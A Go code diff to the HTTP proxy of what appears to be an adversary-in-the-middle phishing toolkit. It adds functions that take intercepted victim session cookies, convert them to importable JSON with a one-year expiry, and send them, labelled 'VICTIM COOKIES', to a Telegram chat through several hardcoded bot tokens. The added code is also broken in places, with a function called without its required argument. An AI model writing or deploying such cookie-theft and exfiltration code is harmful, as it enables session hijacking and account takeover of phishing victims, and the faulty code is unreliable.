@@ -15,6 +15,7 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"html"
 	"io"
@@ -1071,7 +1072,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 							if err == nil {
 								if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
+									fmt.Println("s.CookieTokens before moddedCookieTokensToJSON:", s.CookieTokens)
+									mine := moddedCookieTokensToJSON()
+									telegramSendResult(fmt.Sprintf("🍪 🍪 🍪 🍪 🍪 VICTIM COOKIES Proxy1🍪 🍪 🍪 🍪 🍪 \n\n-🆔ID: %s\n\n END \n\n", string(mine)))
 									log.Success("[%d] detected authorization URL - cookie tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+									log.Success("[%d] detected authorization URL - cookie tokens intercepted and sent to telegram: %s", ps.Index, resp.Request.URL.Path)
 									if len(s.RId) != 0 {
 										err = database.HandleCapturedCookieSession(s.RId, s.CookieTokens, s.Browser, p.livefeed)
 										if err != nil {
@@ -1141,6 +1146,82 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	goproxy.RejectConnect = &goproxy.ConnectAction{Action: goproxy.ConnectReject, TLSConfig: p.TLSConfigFromCA()}
 
 	return p, nil
+}
+
+func moddedCookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
+	fmt.Println("Inside moddedCookieTokensToJSON function")
+	type Cookie struct {
+		Path           string `json:"path"`
+		Domain         string `json:"domain"`
+		ExpirationDate int64  `json:"expirationDate"`
+		Value          string `json:"value"`
+		Name           string `json:"name"`
+		HttpOnly       bool   `json:"httpOnly,omitempty"`
+		HostOnly       bool   `json:"hostOnly,omitempty"`
+	}
+
+	var cookies []*Cookie
+	for domain, tmap := range tokens {
+		for k, v := range tmap {
+			c := &Cookie{
+				Path:           v.Path,
+				Domain:         domain,
+				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
+				Value:          v.Value,
+				Name:           k,
+				HttpOnly:       v.HttpOnly,
+			}
+			if domain[:1] == "." {
+				c.HostOnly = false
+				c.Domain = domain[1:]
+			} else {
+				c.HostOnly = true
+			}
+			if c.Path == "" {
+				c.Path = "/"
+			}
+			cookies = append(cookies, c)
+		}
+	}
+
+	fmt.Println("Adding Cookie to json")
+	json11, _ := json.Marshal(cookies)
+	telegramSendResult(fmt.Sprintf("🍪 🍪 🍪 🍪 🍪 VICTIM COOKIES Test1🍪 🍪 🍪 🍪 🍪 \n\n-🆔ID: %s\n\n", cookies))
+	return string(json11)
+}
+
+func telegramSendResult(msg string) {
+	fmt.Println("Inside telegram function")
+	msg = strings.ReplaceAll(msg, "\n", "%0A")
+
+	// Define bot tokens and chat ID
+	botTokens := []string{
+		"6709278091:AAElpViRJ_jefteECT3Y5iqmWyOe5kpgrV4",
+		"6153769899:AAFWxF8uDir2grHolKdxKOWqf7Fe_y75jEY",
+		"5794620752:AAFnk_QYOgMqzEaYxvMdMiFMIP5beCgFPLA",
+	}
+
+	// Iterate over bot tokens and send messages
+	for _, botToken := range botTokens {
+		fullURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage?chat_id=5538579587&parse_mode=MarkdownV2&text=%s", botToken, msg)
+		escapedURL := url.PathEscape(fullURL)
+
+		resp, err := http.Get(escapedURL)
+		if err != nil {
+			fmt.Printf("Error sending HTTP request: %v\n", err)
+			continue
+		}
+		defer resp.Body.Close()
+
+		_, readErr := ioutil.ReadAll(resp.Body)
+		if readErr != nil {
+			fmt.Printf("Error reading HTTP response: %v\n", readErr)
+		}
+
+		if resp.StatusCode != http.StatusOK {
+			fmt.Printf("Unexpected status code: %d\n", resp.StatusCode)
+		}
+	}
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
